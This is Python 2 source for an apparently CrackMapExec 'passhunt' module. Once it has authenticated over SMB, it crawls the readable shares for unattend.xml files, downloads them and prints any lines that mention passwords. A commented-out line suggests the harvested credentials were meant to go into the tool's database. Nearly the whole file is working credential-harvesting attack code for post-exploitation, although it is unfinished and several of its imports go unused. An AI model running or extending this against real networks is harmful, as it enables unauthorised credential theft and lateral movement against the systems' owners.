import xml.etree.ElementTree as ET
from Cryptodome.Cipher import AES
from base64 import b64decode
from binascii import unhexlify
from StringIO import StringIO
import re

class CMEModule:
    '''
      Module by @binkboyd
    '''

    name = 'passhunt'
    description = 'Spiders shares for known password files'
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        '''

    def on_login(self, context, connection):
        shares = connection.shares()
        for share in shares:
            if 'READ' in share['access']:

                context.log.success('Found readable share %s' % share['name'])
                context.log.info('Searching for files containing potential passwords')

                paths = connection.spider(share['name'], pattern=['unattend.xml','Unattend.xml'])

                for path in paths:
                    context.log.info('Found {}'.format(path))

                    buf = StringIO()
                    connection.conn.getFile(share['name'], path, buf.write)
                    xml = ET.fromstring(buf.getvalue())
                    data = buf.getvalue().splitlines()
                    for l in data:
                        m = re.search("password",l,re.IGNORECASE)
                        if m:
                            print l
                
                    

                    #context.db.add_credential('plaintext', '', username, password, pillaged_from=hostid)
